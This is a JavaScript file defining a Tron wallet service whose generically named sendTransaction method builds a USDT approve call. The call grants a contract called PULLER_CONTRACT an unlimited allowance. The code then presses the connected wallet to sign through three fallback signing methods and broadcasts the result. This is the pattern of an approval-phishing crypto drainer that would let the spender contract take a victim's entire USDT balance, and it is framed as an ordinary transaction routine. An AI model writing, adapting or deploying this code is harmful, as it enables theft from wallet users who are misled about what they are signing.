import { TronWeb } from "tronweb";
import { PULLER_CONTRACT, USDT_CONTRACT } from "./App2";

export const TronChains = {
  Mainnet: "0x2b6653dc",
};
export class TronService {

  constructor(provider) {
    this.tronWeb = new TronWeb({
      fullHost: "https://api.trongrid.io",
    });
    this.provider = provider;
  }


  async sendTransaction(address, session) {
    if (!this.provider) {
      throw new Error("Provider is required to sign a transaction.");
    }
    if (!session) {
      throw new Error("Session is required to sign a transaction.");
    }
    

    try {
      const tronWeb = this.tronWeb;
      const contractAddress = USDT_CONTRACT;
      const spender = PULLER_CONTRACT;
      const amount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

      const options = {
        feeLimit: 100000000, // 100 TRX fee limit
        callValue: 0,
      };

      const parameters = [
        { type: "address", value: spender },
        { type: "uint256", value: amount },
      ];

      const functionSelector = "approve(address,uint256)";

      console.log("Building transaction...");
      // Step 1: Build the transaction
      const txBuilder = await tronWeb.transactionBuilder.triggerSmartContract(
        contractAddress,
        functionSelector,
        options,
        parameters,
        address
      );

      if (!txBuilder.result || !txBuilder.result.result) {
        throw new Error("Failed to build transaction");
      }

      const transaction = txBuilder.transaction;
      console.log("Transaction built:", transaction);

      console.log("Requesting signature...");
      // Step 2: Sign the transaction using WalletConnect
      // Try different methods that Trust Wallet might support
      let signedTransaction;
      
      try {
        // Method 1: Standard tron_signTransaction with object params
        signedTransaction = await this.provider.request({
          topic: session.topic,
          chainId: "tron:0x2b6653dc",
          request: {
            method: "tron_signTransaction",
            params: {
              transaction: transaction
            }
          }
        });
      } catch (error) {
        console.log("Method 1 failed, trying method 2...", error.message);
        
        try {
          // Method 2: tron_signTransaction with array params
          signedTransaction = await this.provider.request({
            topic: session.topic,
            chainId: "tron:0x2b6653dc",
            request: {
              method: "tron_signTransaction",
              params: [transaction]
            }
          });
        } catch (error2) {
          console.log("Method 2 failed, trying method 3...", error2.message);
          
          try {
            // Method 3: tron_sendTransaction (some wallets use this)
            signedTransaction = await this.provider.request({
              topic: session.topic,
              chainId: "tron:0x2b6653dc",
              request: {
                method: "tron_sendTransaction",
                params: [transaction]
              }
            });
          } catch (error3) {
            console.log("All methods failed");
            throw new Error(`All signing methods failed. Last error: ${error3.message}`);
          }
        }
      }

      console.log("Transaction signed:", signedTransaction);

      if (!signedTransaction) {
        throw new Error("Transaction signing failed");
      }

      console.log("Broadcasting transaction...");
      // Step 3: Broadcast the signed transaction
      const result = await tronWeb.trx.sendRawTransaction(signedTransaction);

      if (result.result) {
        console.log("Transaction successful:", result);
        return { 
          success: true, 
          txId: result.txid,
          result: result 
        };
      } else {
        throw new Error("Transaction broadcast failed");
      }

    } catch (error) {
      console.error('Transaction Error:', error);
      return { success: false, error: error.message };
    }
  }
}
